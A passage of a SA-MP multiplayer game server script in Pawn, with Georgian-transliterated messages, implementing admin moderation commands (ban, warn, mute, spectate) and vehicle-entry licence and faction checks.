		pData[id][pMut] = time;
		UpdatePlayerData(id,"mut",time);
		format(mes,sizeof(mes),"Helper(ma) %s Daado Mute %s - %d Wutit. Mizezi: %s",Name2(playerid),Name2(id),time,tmp);
		SendClientMessageToAll(CADMIN,mes);
	}
	if(!strcmp(cmd,"/ban",true))
	{
		if(pData[playerid][pAdmin] < 4) return true;
		if(GetPVarInt(playerid,"ANTIFLOOD_KICK") > gettime()) return SendClientMessage(playerid,CGRAY,"Gtxovt Daelodot..");
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp) || !isNumeric(tmp)) return SendClientMessage(playerid,CGRAY,"/ban [ID Motamashis] [Ramdeni Dgit] [Mizezi]");
		new id = strval(tmp);
		if(!IsPlayerConnected(id) || IsKicked(id)) return SendClientMessage(playerid,CGRAY,"Araswori ID");
		if(pData[id][pAdmin] > pData[playerid][pAdmin]) return SendClientMessage(playerid,CGRAY,"ES ID - Administratoria");
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp) || !isNumeric(tmp)) return SendClientMessage(playerid,CGRAY,"/ban [ID Motamashis] [Ramdeni Dgit] [Mizezi]");
		new time = strval(tmp);
		if(time < 1 || time > 30 && pData[playerid][pAdmin] < 5) return SendClientMessage(playerid,CGRAY,"Araswori Dgis Raodenoba");
		if(time < 0 || time > 30 && pData[playerid][pAdmin] >= 5) return SendClientMessage(playerid,CGRAY,"Araswori Dgis Raodenoba");
		tmp = strrest(cmdtext, idx);
		if(!strlen(tmp)) return SendClientMessage(playerid,CGRAY,"/ban [ID Motamashis] [Ramdeni Dgit] [Mizezi]");
		if(IsIP(tmp) || CheckString(tmp)) return Proverka(playerid, tmp);
		new nick[24], ipz[30];
		new houseid = pData[id][pHouse]-1;
		ServerBan(id,time);
		GetPlayerName(id,nick,24);
		GetPlayerIp(id,ipz,24);
		format(mes,sizeof(mes),"Administratorma %s Daado Bani %s. Amdeni Dgit: %d. Mizezi: %s",Name2(playerid),nick,time,tmp);
		SendClientMessageToAll(CADMIN,mes);
		format(mes,sizeof(mes),"Registraciis Dros IP: %s | AXLA IP: %s",ipz, ipz);
		AdminChat(CADMIN,mes);
		pData[playerid][pHouse] = 0;
		gHouses[houseid][houseOwnerID] = 0;
		strdel(gHouses[houseid][houseOwner],0,24);
		strdel(gHouseHabits[houseid][0],0,24);
		strdel(gHouseHabits[houseid][1],0,24);
		strdel(gHouseHabits[houseid][2],0,24);
		gHouses[houseid][houseHabitID][0] = 0;
		gHouses[houseid][houseHabitID][1] = 0;
		gHouses[houseid][houseHabitID][2] = 0;
		for(new i;i<9;i++)
		{
			if(i < 5)
			{
				gHouses[houseid][houseImprove][i] = 0;
				if(i < 4) gHouses[houseid][houseSkin][i] = 0;
			}
			gHouses[houseid][houseGun][i] = 0;
		}
		gHouses[houseid][houseSafeCode] = 0;
		gHouses[houseid][houseSafeMoney] = 0;
		gHouses[houseid][houseDrugs] = 0;
		gHouses[houseid][houseProducts] = 0;
		DestroyDynamicPickup(gHousePickup[houseid]);
		gHousePickup[houseid] = CreateDynamicPickup(1273,1,gHouses[houseid][houseX],gHouses[houseid][houseY],gHouses[houseid][houseZ]);
		DestroyDynamicMapIcon(gHouseIcon[houseid]);
		gHouseIcon[houseid] = CreateDynamicMapIcon(gHouses[houseid][houseX],gHouses[houseid][houseY],gHouses[houseid][houseZ],31,CWHITE);
		NewKick(id);
		SetPVarInt(playerid,"ANTIFLOOD_KICK",gettime()+10);
	}
	if(!strcmp(cmd,"/warn",true))
	{
		if(pData[playerid][pAdmin] < 3) return true;
		if(GetPVarInt(playerid,"ANTIFLOOD_KICK") > gettime()) return SendClientMessage(playerid,CGRAY,"Gtxovt Daelodot..");
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp) || !isNumeric(tmp)) return SendClientMessage(playerid,CGRAY,"/warn [ID Motamashis] [Mizezi]");
		new id = strval(tmp);
		if(!IsPlayerConnected(id) || IsKicked(id)) return SendClientMessage(playerid,CGRAY,"Araswori ID");
		if(pData[id][pAdmin] > pData[playerid][pAdmin]) return SendClientMessage(playerid,CGRAY,"ES ID - Administratoria.");
		tmp = strrest(cmdtext, idx);
		if(!strlen(tmp)) return SendClientMessage(playerid,CGRAY,"/warn [ID Motamashis] [Mizezi]");
		if(IsIP(tmp) || CheckString(tmp)) return Proverka(playerid, tmp);
		if(pData[id][pFraction])
  		{
  		    new query[180];
			format(query,sizeof(query),"UPDATE `members` SET `fraction` = '0', `rank` = '0', `fractionskin` = '0', `subfraction` = '0' WHERE `nickname` = '%s'",Name2(id));
			mysql_empty(mysql, query);
			if(mysql_errno()) return SendClientMessage(playerid,CRED,"Shecdoma MySQL");
			pData[id][pFraction] = 0;
			pData[id][pRank] = 0;
			pData[id][pFractionSkin] = 0;
			pData[id][pSubfraction] = 0;
			SetPlayerColor(id,0xFFFFFF11);
			new houseid = pData[id][pHouse]-1;
			if(!(houseid+1) || ((houseid+1) > 0 && !GetString(Name2(id),gHouses[houseid][houseOwner]))) SetPlayerSkin(id,pData[id][pSkin]);
			else if(!gHouses[houseid][houseImprove][1]) SetPlayerSkin(id,pData[id][pSkin]);
			else
			{
				for(new x; x < 3; x ++) {
					if(!gHouses[houseid][houseSkin]) continue;
					pData[id][pSkin] = gHouses[houseid][houseSkin];
					if(GetPlayerSkin(id) == gHouses[houseid][houseSkin][3]) SetPlayerSkin(id,pData[id][pSkin]);
				}
				gHouses[houseid][houseSkin][3] = 0;
			}
			format(mes,sizeof(mes),"Tqven Gagagdot Organizaciidan Administratorma %s",Name2(playerid));
			SendClientMessage(id,CBADINFO,mes);
			format(mes,sizeof(mes),"%s Gaagdet Organizaciidan.",Name2(id));
			SendClientMessage(playerid,CINFO,mes);
		}
		new level = floatround(float(pData[id][pWarn] - gCurDay) / WARN_TIME,floatround_ceil);
		if(!pData[playerid][pWarn] || level <= 2)
		{
			if(pData[id][pWarn] > gCurDay) pData[id][pWarn] += WARN_TIME;
			else pData[id][pWarn] = gCurDay + WARN_TIME;
			UpdatePlayerData(id,"warn",pData[id][pWarn]);
			format(mes,sizeof(mes),"Administratorma %s Misca Gafrtxileba %s. Mizezi: %s",Name2(playerid),Name2(id),tmp);
		}
		else
		{
			pData[id][pWarn] = 0;
			UpdatePlayerData(id,"warn",pData[id][pWarn]);
			format(mes,sizeof(mes),"Administratorma %s Daado Bani %s 10 Dgit (3 Gafrtxileba). Mizezi: %s",Name2(playerid),Name2(id),tmp);
			ServerBan(id,10);
		}
		SendClientMessageToAll(CADMIN,mes);
		SetPVarInt(playerid,"ANTIFLOOD_KICK",gettime()+10);
	}
	if(!strcmp(cmd,"/unwarn",true))
	{
		if(pData[playerid][pAdmin] < 3) return true;
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp) || !isNumeric(tmp)) return SendClientMessage(playerid,CGRAY,"/unwarn [ID Motamashis]");
		new id = strval(tmp);
		if(!IsPlayerConnected(id)) return SendClientMessage(playerid,CGRAY,"Araswori ID.");
		if(!pData[id][pWarn]) return SendClientMessage(playerid,CGRAY,"Motamashes Ar Aqvs Arcerti Warn.");
		pData[id][pWarn] = 0;
		UpdatePlayerData(id,"warn",pData[id][pWarn]);
		format(mes,sizeof(mes),"[A] %s Moxsna(а) Gafrtxileba %s",Name2(playerid),Name2(id));
		AdminChat(CORANGE,mes);
		format(mes,sizeof(mes),"Administratorma %s Mogxsnat Gafrtxileba Account-Ze.",Name2(playerid));
		SendClientMessage(id,CADMIN,mes);
	}
	if(!strcmp(cmd,"/unmute",true))
	{
		if(!pData[playerid][pAdmin]) return true;
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp) || !isNumeric(tmp)) return SendClientMessage(playerid,CGRAY,"/unmute [ID Motamashis]");
		new id = strval(tmp);
		if(!IsPlayerConnected(id)) return SendClientMessage(playerid,CGRAY,"Araswori ID.");
		pData[id][pMut] = 0;
		UpdatePlayerData(id,"mut",0);
		format(mes,sizeof(mes),"[A] %s Moxsna(а) Mute %s",Name2(playerid),Name2(id));
		AdminChat(CORANGE,mes);
		format(mes,sizeof(mes),"Administratorma %s Mogxsna Mute",Name2(playerid));
		SendClientMessage(id,CADMIN,mes);
	}
	if(!strcmp(cmd,"/unban",true))
	{
		if(pData[playerid][pAdmin] < 4) return true;
		tmp = strrest(cmdtext,idx);
		if(!strlen(tmp)) return SendClientMessage(playerid,CGRAY,"/unban [Name Motamashis]");
		mysql_real_escape_string(tmp,tmp);
		new query[128];
		format(query,sizeof(query),"SELECT `ban` FROM `members` WHERE `nickname` = '%s'",tmp);
		mysql_tquery(mysql, query, "mysql_unban", "ds", playerid, tmp);
	}
	if(!strcmp(cmd,"/re",true))
	{
		if(pData[playerid][pAdmin] < 1) return true;
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp) || !isNumeric(tmp)) return SendClientMessage(playerid,CGRAY,"/sp [ID Motamashis]");
		new id = strval(tmp);
		if(!IsPlayerConnected(id)) return SendClientMessage(playerid,CGRAY,"Araswori ID");
		if((pData[playerid][pAdmin] < 5 && pData[id][pAdmin] >= 5)) return SendClientMessage(playerid, CADMIN, "Shecdoma!");
        new pstate = GetPlayerState(id), vehicleid = GetPlayerVehicleID(id);
		if(GetPVarInt(playerid,"Spectating") == 0)
		{
			TogglePlayerSpectating(playerid,1);
			new Float:x,Float:y, Float:z;
			GetPlayerPos(playerid,x,y,z);
			SetPVarFloat(playerid,"oldx",x);
			SetPVarFloat(playerid,"oldy",y);
			SetPVarFloat(playerid,"oldz",z);
			SetPVarInt(playerid,"oldint",GetPlayerInterior(playerid));
			SetPVarInt(playerid,"oldworld",GetPlayerVirtualWorld(playerid));
			SetPVarInt(playerid,"Spectating",1);
			PlayerTextDrawShow(playerid,RECON[playerid]);
		}
		if(GetPlayerState(id) == 9 && pData[id][pAdmin] >= 1) return SendClientMessage(playerid,CGRAY,"Motamashe Gadavida Satvaltvalo Rejimshi");
		pTemp[playerid][pSpectatee] = id;
		SetPlayerInterior(playerid,GetPlayerInterior(id));
		SetPlayerVirtualWorld(playerid,GetPlayerVirtualWorld(id));
		if(pstate == PLAYER_STATE_DRIVER || pstate == PLAYER_STATE_PASSENGER) PlayerSpectateVehicle(playerid,vehicleid);
		else PlayerSpectatePlayer(playerid,id);
		ShowMenuForPlayer(specmenu,playerid);
		new fps = 45 + random(60), Float:hppp, Float:aermor, Float:health, mes2[300];
		GetPlayerArmour(id,aermor);
		GetPlayerHealth(id,hppp);
		if(IsPlayerInAnyVehicle(id)) GetVehicleHealth(GetPlayerVehicleID(id),health);
		format(mes2,sizeof(mes2),"~w~%s~n~~n~~r~Ping: ~w~%d~n~~r~FPS: ~w~%d~n~~n~~y~Interior: ~w~%d~n~~y~Virtual World: ~w~%d~n~~y~Animation: ~w~%d~n~~y~Speed: ~w~%d~n~~n~~g~Armour: ~w~%.2f~n~~g~Health: ~w~%.2f~n~~g~Car HP: ~w~%.0f~n~",Name2(id),GetPlayerPing(id),fps,GetPlayerInterior(id),GetPlayerVirtualWorld(id),GetPlayerAnimationIndex(id),SpeedVehicle(id) / 2,aermor,hppp,health);
		PlayerTextDrawSetString(playerid,RECON[playerid],mes2);
	}
	if(!strcmp(cmd, "/allsave", true))
	{
	    if(pData[playerid][pAdmin] < 6) return true;
	    for(new idxf=0, i=0; idxf<cvector_size(players); idxf++)
		{
  			i = cvector_get(players, idxf);
  			if(GetPVarInt(i,"Logined") == 0) continue;
	    	OnPlayerDisconnecter(i);
		}
	}
	if(!strcmp(cmd, "/leaders", true))
 	{
 	    new zStr[2000];
 	    format(zStr, sizeof(zStr), "Organizacia - Tanamdeboba - Saxeli - Telefoni\n\n{FFFFFF}");
 	    for(new idxf=0, i=0; idxf<cvector_size(players); idxf++)
		{
  			i = cvector_get(players, idxf);
			if(pData[i][pAdmin] > 0) continue;
			if(pData[i][pFraction] && IsALeader(i))
			format(zStr, sizeof(zStr), "%s%s - %s - %s - %d\n", zStr, gFractionName[pData[i][pFraction]-1], gFractionRankName[pData[i][pFraction]-1][pData[i][pRank]-1], Name2(i), pData[i][pPhone]);
		}
   		ShowPlayerDialog(playerid, dMes, DIALOG_STYLE_MSGBOX, "{ffff00}Leaders", zStr, "OK", "");
   		return true;
	}
	if(!strcmp(cmd, "/sabajo", true))
	{
 		if(PlayerToPoint(6.0,playerid,53.5108,-1525.2738,5.1378)) // sazgvari 1
 		{
	 		if(pData[playerid][pWanted]) return SendClientMessage(playerid,CGRAY,"Shen Idzebnebi!!");
	 		TogglePlayerControllable(playerid, 0);
	 		SendClientMessage(playerid,CGRAY,"Mimdinareobs Shemowmeba. Gtxovt Moitminot Ramodenime Wami...");
	 		SetTimerEx("Sabajo1",5000,false,"i",playerid);
	 		SetTimerEx("Unfreez",5000,false,"i",playerid);
	 	}
	 	if(PlayerToPoint(6.0,playerid,609.4002, -1201.2032, 16.6705)) // sazgvari 2
 		{
	 		if(pData[playerid][pWanted]) return SendClientMessage(playerid,CGRAY,"Shen Idzebnebi!!");
	 		TogglePlayerControllable(playerid, 0);
	 		SendClientMessage(playerid,CGRAY,"Mimdinareobs Shemowmeba. Gtxovt Moitminot Ramodenime Wami...");
	 		SetTimerEx("Sabajo2",5000,false,"i",playerid);
	 		SetTimerEx("Unfreez",5000,false,"i",playerid);
	 	}
	 	if(PlayerToPoint(6.0,playerid,632.0834, -1191.6199, 16.6705)) // sazgvari 3
 		{
	 		if(pData[playerid][pWanted]) return SendClientMessage(playerid,CGRAY,"Shen Idzebnebi!!");
	 		TogglePlayerControllable(playerid, 0);
	 		SendClientMessage(playerid,CGRAY,"Mimdinareobs Shemowmeba. Gtxovt Moitminot Ramodenime Wami...");
	 		SetTimerEx("Sabajo3",5000,false,"i",playerid);
	 		SetTimerEx("Unfreez",5000,false,"i",playerid);
	 	}
	 	if(PlayerToPoint(6.0,playerid,1662.4149, -60.3190, 34.5715)) // sazgvari 4
 		{
	 		if(pData[playerid][pWanted]) return SendClientMessage(playerid,CGRAY,"Shen Idzebnebi!!");
	 		TogglePlayerControllable(playerid, 0);
	 		SendClientMessage(playerid,CGRAY,"Mimdinareobs Shemowmeba. Gtxovt Moitminot Ramodenime Wami...");
	 		SetTimerEx("Sabajo4",5000,false,"i",playerid);
	 		SetTimerEx("Unfreez",5000,false,"i",playerid);
	 	}
	}
	if (!strcmp(cmd,"/id",true))
	{
		tmp = strrest(cmdtext, idx);
		if(!strlen(tmp)) return SendClientMessage(playerid,CGRAY,"/id [Saxeli Motamashis]");
		new id=-1,name[24];
		if(!isNumeric(tmp))
		{
			for(new idxf=0, i=0; idxf<cvector_size(players); idxf++)
			{
  				i = cvector_get(players, idxf);
				if(!IsPlayerConnected(i)) continue;
				GetPlayerName(i,name,24);
				if(strfind(name,tmp,true) != -1) {id = i; break;}
			}
			if(id == -1) return SendClientMessage(playerid,CGRAY,"Ver Moidzebna");
		}
		else
		{
			id = strval(tmp);
			if(!IsPlayerConnected(id)) return SendClientMessage(playerid,CGRAY,"Araswori ID");
			GetPlayerName(id,name,24);
		}
		format(mes,sizeof(mes),"%s {66CC66}id %d",name,id);
		SendClientMessage(playerid,CWHITE,mes);
		return true;
	}
	if(!strcmp(cmd,"/pm",true))
	{
		if(pData[playerid][pAdmin] < 1) return true;
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp) || !isNumeric(tmp)) return SendClientMessage(playerid,CGRAY,"/pm [ID Motamashis] [Pasuxi]");
		new id = strval(tmp);
		tmp = strrest(cmdtext, idx);
		format(mes,sizeof(mes),"[A] %s Pasuxi: %s",Name2(playerid),tmp);
		SendClientMessage(id,0x7FB9B7AA,mes);
		format(mes,sizeof(mes),"[A] %s Pasuxi: %s: %s",Name2(playerid),Name2(id),tmp);
		AdminChat(0x7FB9B7AA,mes);
	}
	if(!strcmp(cmd,"/ao",true))
	{
		if(pData[playerid][pAdmin] < 5) return true;
		tmp = strrest(cmdtext, idx);
		if(!strlen(tmp)) return SendClientMessage(playerid,CGRAY,"/ao [Texti]");
		if(strlen(tmp) < 1 || strlen(tmp) > 70) return SendClientMessage(playerid,CGRAY,"Texti Dzalian Grdzelia, Daweret Mokle Texti.");
		format(mes,sizeof(mes),"Administrator %s: %s",Name2(playerid),tmp);
		SendClientMessageToAll(0xFBEC5DFF,mes);
	}
	if(!strcmp(cmd,"/o",true))
	{
		if(pData[playerid][pAdmin] < 1) return true;
		tmp = strrest(cmdtext, idx);
		if(!strlen(tmp)) return SendClientMessage(playerid,CGRAY,"/o [Texti]");
		if(strlen(tmp) < 1 || strlen(tmp) > 70) return SendClientMessage(playerid,CGRAY,"Texti Dzalian Grdzelia, Daweret Mokle Texti.");
		format(mes,sizeof(mes),"[OOC]%s: %s",Name2(playerid),tmp);
		SendClientMessageToAll(0xFFFFFFAA,mes);
	}
	if(!strcmp(cmd,"/omembers",true))
	{
		if(pData[playerid][pOfforg] < 1) return true;
		SendClientMessage(playerid,CINFO,"Un.Off Organizaciis Wevrebi {"#cGREEN"}Online:");
		for(new idxf=0, g=1, i=0; idxf<cvector_size(players); idxf++)
		{
 			i = cvector_get(players, idxf);
			if(pData[i][pOfforg] != pData[playerid][pOfforg]) continue;
			format(mes,sizeof(mes),"%d. %s[%d], {0C97C2}[%d Rank]",g++,Name2(i),i,pData[i][pOffrang]);
			SendClientMessage(playerid,0xbbbbbbFF,mes);
		}
	}
	if(!strcmp(cmd,"/admins",true))
	{
		if(pData[playerid][pAdmin] < 1) return true;
		SendClientMessage(playerid,CINFO5,"Administratorta Sia:");
		for(new idxf=0, g=1, i=0; idxf<cvector_size(players); idxf++)
		{
 			i = cvector_get(players, idxf);
			if(!IsPlayerConnected(i) || !pData[i][pAdmin]) continue;
			format(mes,sizeof(mes),"%d. %s [%d], {FFAE70}[%d]",g++,Name2(i),i,pData[i][pAdmin]);
			SendClientMessage(playerid,0x8CB6AE,mes);
		}
	}
	if(!strcmp(cmd,"/helpers",true))
	{
		SendClientMessage(playerid,CINFO5,"Helperta Sia:");
		for(new idxf=0, g=1, i=0; idxf<cvector_size(players); idxf++)
		{
 			i = cvector_get(players, idxf);
			if(!IsPlayerConnected(i) || !pData[i][pHelper]) continue;
			format(mes,sizeof(mes),"%d. %s [%d], {FFAE70}[%d]",g++,Name2(i),i,pData[i][pHelper]);
			SendClientMessage(playerid,0x8CB6AE,mes);
		}
	}
	if(!strcmp(cmd,"/mute",true))
	{
		if(!pData[playerid][pAdmin]) return true;
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp) || !isNumeric(tmp)) return SendClientMessage(playerid,CGRAY,"/mute [ID Motamashis] [Ramdeni Wutit] [Mizezi]");
		new id = strval(tmp);
		if(!IsPlayerConnected(id)) return SendClientMessage(playerid,CGRAY,"Araswori ID");
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp) || !isNumeric(tmp)) return SendClientMessage(playerid,CGRAY,"/mute [ID Motamashis] [Ramdeni Wutit] [Mizezi]");
		new time = strval(tmp);
		if(time < 1 || time > 600) return SendClientMessage(playerid,CGRAY,"Araswori Wutebis Raodenoba");
		tmp = strrest(cmdtext, idx);
		if(!strlen(tmp)) return SendClientMessage(playerid,CGRAY,"/mute [ID Motamashis] [Ramdeni Wutit] [Mizezi]");
		pData[id][pMut] = time;
		UpdatePlayerData(id,"mut",time);
		format(mes,sizeof(mes),"Administrator(ma) %s Daado Mute %s Amdeni %d Wutit. Mizezi: %s",Name2(playerid),Name2(id),time,tmp);
		SendClientMessageToAll(CADMIN,mes);
	}
	if(!strcmp(cmd,"/givemoney",true))
	{
		if(pData[playerid][pAdmin] < 6) return true;
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp) || !isNumeric(tmp)) return SendClientMessage(playerid,CGRAY,"/givemoney [ID игрока] [К-во денег]");
		new id = strval(tmp);
		if(!IsPlayerConnected(id)) return SendClientMessage(playerid,CGRAY,"Araswori ID Motamashis");
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp) || !isNumeric(tmp)) return SendClientMessage(playerid,CGRAY,"/givemoney [ID Motamashis] [Raodenoba]");
		new money = strval(tmp);
		if(money < 1 || money > 5000000) return SendClientMessage(playerid,CGRAY,"Araswori Raodenoba");
		TransferMoney(-1,id,money);
	}
	if(!strcmp(cmd,"/fillcar",true))
	{
		if(pData[playerid][pAdmin] < 2) return true;
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp) || !isNumeric(tmp)) return SendClientMessage(playerid,CGRAY,"/fillcar [ID Avtomobilis] (id car = /dl)");
		new vid = strval(tmp);
		new model = GetVehicleModel(vid);
		if(!model) return SendClientMessage(playerid,CGRAY,"Araswori ID Avtomobilis");
		gVehicles[vid-1][vFuel] = 100;
	}
	return true;
}

public OnPlayerEnterVehicle(playerid, vehicleid, ispassenger)
{
	UseEnter[playerid] = true;
    IDVEH[playerid] = vehicleid;
	if(pTemp[playerid][pCuffee] == playerid)
	{
		SendClientMessage(playerid,CGRAY,"Tqven Ar Shegidzliat Daadot Borkilebi Avtomobilshi");
		RemovePlayerFromVehicle(playerid);
		ClearAnimations(playerid);
		return true;
	}
	return true;
}
public OnPlayerStateChange(playerid, newstate, oldstate)
{
	if(newstate == PLAYER_STATE_DRIVER || newstate == PLAYER_STATE_PASSENGER)
    {
        if(IDVEH[playerid] != GetPlayerVehicleID(playerid) || UseEnter[playerid] != true) Kick(playerid);
        UseEnter[playerid] = false;
    }
	if(newstate == PLAYER_STATE_DRIVER)
	{
		SetPlayerArmedWeapon(playerid,0);
		new vehicleid = GetPlayerVehicleID(playerid);
		new model = GetPlayerVehicleSeat(playerid);
		if(model != 128)
		{
			if(!model)
			{
				model = GetVehicleModel(GetPlayerVehicleID(playerid));
				if(!(400 <= model <= 611) || MaxPassengers[model - 400 >>> 3] >>> ((model - 400 & 7) << 2) & 0xF == 15) return Kick(playerid);
			}
			else return Kick(playerid);
		}
		new id = GetVehicleModel(vehicleid)-400;
		if(id<0)
		{
			RemovePlayerFromVehicle(playerid);
			SendClientMessage(playerid,CGRAY,"Ошибка");
			return true;
		}
		SetPVarInt(playerid, "vehid", vehicleid);
		if(vehicleid) gVehicleDriver[vehicleid-1] = playerid;
		if(GetVehicleType(id) == VEHICLE_TYPE_CAR)
	  	{
	   		if(pData[playerid][pLicenses][LIC_DRIVING] || IsNotDriving(vehicleid) || GetPVarInt(playerid, "testcar1") == 1){}
	   		else
	   		{
	    		RemovePlayerFromVehicle(playerid);
	    		SendClientMessage(playerid,CGRAY,"Shen Ar Gaqvs Martvis Mowmoba.");
	    		return true;
	   		}
	  	}
	  	if(GetVehicleType(id) == VEHICLE_TYPE_PLANE)
	  	{
	   		if(pData[playerid][pLicenses][LIC_FLY]){}
	   		else
	   		{
		    	RemovePlayerFromVehicle(playerid);
		    	SendClientMessage(playerid,CGRAY,"Shen Ar Gaqvs Pilotis Licenzia.");
		    	return true;
	   		}
	  	}
	  	if(GetVehicleType(id) == VEHICLE_TYPE_BOAT)
	  	{
	   		if(pData[playerid][pLicenses][LIC_BOAT]){}
	   		else
	   		{
			    RemovePlayerFromVehicle(playerid);
			    SendClientMessage(playerid,CGRAY,"Shen Ar Gaqvs Wylis Transportis Licenzia.");
			    return true;
	   		}
	  	}
		if(gTransport[id][trFuelable] != 0)
		{
		    SendClientMessage(playerid,0xA1884DFF,"Rom Daqoqo Dzrava Daachire {"#cWHITE"}\"2\"");
            PlayerTextDrawSetPreviewModel(playerid,privcar[playerid],GetVehicleModel(GetPlayerVehicleID(playerid)));
			PlayerTextDrawShow(playerid,privcar[playerid]);
			PlayerTextDrawShow(playerid,gVehInfo[playerid]);
		}
		if(vehicleid >= aTaxi[0] && vehicleid <= aTaxi[1])
		{
			if(pData[playerid][pJob] != 3)
			{
				SendClientMessage(playerid,CGRAY,"Shen Ar Xar Taqsisti");
				RemovePlayerFromVehicle(playerid);
				return true;
			}
			if(pTemp[playerid][pTaxiID] == vehicleid) return true;
			for(new idxf=0, i=0; idxf<cvector_size(players); idxf++)
			{
  				i = cvector_get(players, idxf);
				if(!IsPlayerConnected(i) || i == playerid) continue;
				if(pTemp[i][pTaxiID] == vehicleid)
				{
					SendClientMessage(playerid,CGRAY,"Es Taqsi Ukve Daqiravebulia");
					RemovePlayerFromVehicle(playerid);
					return true;
				}
			}
			if(pTemp[playerid][pTaxiID] != INVALID_VEHICLE_ID)
			{
				SendClientMessage(playerid,CGRAY,"Tqven Ukve Daqiravebuli Gyavt Taxi");
				RemovePlayerFromVehicle(playerid);
				return true;
			}
			if(GetPlayerMoneyEx(playerid) < 200)
			{
				SendClientMessage(playerid,CGRAY,"Gsurt Gadaixadot $200 Rom Iqiraot Taxi?");
				RemovePlayerFromVehicle(playerid);
				return true;
			}
			SPFD(playerid,dTaxiRent,0,"Taxi","YES","NO","{"#cWHITE"}Tqven Gsurt Iqiraot Es Taqsti Fasad {"#cRED"}$200{"#cWHITE"}, Romelitac Moemsaxurebit Mgzavrebs?");
		}
		else if(vehicleid >= aMech[0] && vehicleid <= aMech[1])
		{
			if(pData[playerid][pJob] != 4)
			{
				SendClientMessage(playerid,CGRAY,"Tqven Ar Xart Meqaniki");
				RemovePlayerFromVehicle(playerid);
				return true;
			}
			if(pTemp[playerid][pMechID] == vehicleid) return true;
			for(new idxf=0, i=0; idxf<cvector_size(players); idxf++)
			{
  				i = cvector_get(players, idxf);
				if(!IsPlayerConnected(i) || i == playerid) continue;
				if(pTemp[i][pMechID] == vehicleid)
				{
					SendClientMessage(playerid,CGRAY,"Es Ukve Naqiravebia");
					RemovePlayerFromVehicle(playerid);
					return true;
				}
			}
			if(GetPlayerMoneyEx(playerid) < 500)
			{
				SendClientMessage(playerid,CGRAY,"Tqven Gchirdebat $500 Rom Iqiraot Es Buqsiri");
				RemovePlayerFromVehicle(playerid);
				return true;
			}
			ShowPlayerDialog(playerid,dMechRent,0,"Buqsiri","{"#cWHITE"}Tqven Gsurt Iqiraot Es Buqsiri Fasad {"#cRED"}$500{"#cWHITE"}?","YES","NO");
		}
		else if(vehicleid >= aInstructor[0] && vehicleid <= aInstructor[1])
		{
		    if(GetPVarInt(playerid, "testcar1") == 1)
		    {
		        SetPVarInt(playerid,"testcar2",CHECKPOINT_1);
		        SetPlayerRaceCheckpoint(playerid,0,614.2161,-1502.3992,14.6075,-2021.2046,-72.2330,34.9150,5.0);
		    }
			else if(pData[playerid][pFraction] != 1)
			{
				SendClientMessage(playerid,CGRAY,"Es Transporti Xelmisawvdomia Mxolod Instruktoristvis");
				RemovePlayerFromVehicle(playerid);
				return true;
			}
		}
		else if(vehicleid >= aHotel[0][0] && vehicleid <= aHotel[0][1])
		{
			if(pData[playerid][pOtel] != 1)
			{
				SendClientMessage(playerid,CGRAY,"Es Transporti Xelmisawvdomia Mxolod Sastumro: LS");
				RemovePlayerFromVehicle(playerid);
				return true;
			}
		}
		else if(vehicleid >= aHotel[1][0] && vehicleid <= aHotel[1][1])
		{
			if(pData[playerid][pOtel] != 2)
			{
				SendClientMessage(playerid,CGRAY,"Es Transporti Xelmisawvdomia Mxolod Sastumro: SV");
				RemovePlayerFromVehicle(playerid);
				return true;
			}
		}
		else if(vehicleid >= aHotel[2][0] && vehicleid <= aHotel[2][1])
		{
			if(pData[playerid][pOtel] != 3)
			{
				SendClientMessage(playerid,CGRAY,"Es Transporti Xelmisawvdomia Mxolod Sastumro: LV");
				RemovePlayerFromVehicle(playerid);
				return true;
			}
		}
		else if(vehicleid >= aHospital[0][0] && vehicleid <= aHospital[0][1])
		{
			if(pData[playerid][pFraction] != 2 || pData[playerid][pSubfraction] != 1)
			{
				SendClientMessage(playerid,CGRAY,"Es Transporti Xelmisawvdomia Mxolod Hospital LS-Stvis");
				RemovePlayerFromVehicle(playerid);
				return true;
			}
		}
		else if(vehicleid >= aHospital[1][0] && vehicleid <= aHospital[1][1])
		{
			if(pData[playerid][pFraction] != 2 || pData[playerid][pSubfraction] != 2)
			{
				SendClientMessage(playerid,CGRAY,"Es Transporti Xelmisawvdomia Mxolod Hospital SF-Stvis");
				RemovePlayerFromVehicle(playerid);
				return true;
			}
		}
		else if(vehicleid >= aHospital[2][0] && vehicleid <= aHospital[2][1])
		{
			if(pData[playerid][pFraction] != 2 || pData[playerid][pSubfraction] != 3)
			{
				SendClientMessage(playerid,CGRAY,"Es Transporti Xelmisawvdomia Mxolod Hospital LV-Stvis");
				RemovePlayerFromVehicle(playerid);
				return true;
			}
		}
		else if(vehicleid >= aArmy1[0] && vehicleid <= aArmy1[1])
		{
			if(pData[playerid][pFraction] != 8 || pData[playerid][pSubfraction] == 1)
			{
				SendClientMessage(playerid,CGRAY,"Es Transporti Xelmisawvdomia Mxolod ВСН-Stvis");
				RemovePlayerFromVehicle(playerid);
				return true;
			}
			else if(GetVehicleModel(vehicleid) == 520 && pData[playerid][pRank] < 8)
			{
				SendClientMessage(playerid,CGRAY,"Es Transporti Xelmisawvdomia Mxolod 8 Rankidan");
				RemovePlayerFromVehicle(playerid);
				return true;
			}
			else if(GetVehicleModel(vehicleid) == 425 && pData[playerid][pRank] == 5)
			{
				SendClientMessage(playerid,CGRAY,"Es Transporti Xelmisawvdomia Mxolod 5 Rankidan");
				RemovePlayerFromVehicle(playerid);
				return true;
			}
		}
		else if(vehicleid >= aArmy2[0] && vehicleid <= aArmy2[1])
		{
			if(pData[playerid][pFraction] != 8 || pData[playerid][pSubfraction] == 2)
			{
				SendClientMessage(playerid,CGRAY,"Es Transporti Xelmisawvdomia Mxolod ВВС-Stvis");
				RemovePlayerFromVehicle(playerid);
			}
			else if(GetVehicleModel(vehicleid) == 520 && pData[playerid][pRank] == 8)
			{
				SendClientMessage(playerid,CGRAY,"Es Transporti Xelmisawvdomia Mxolod 8 Rankidan");
				RemovePlayerFromVehicle(playerid);
			}
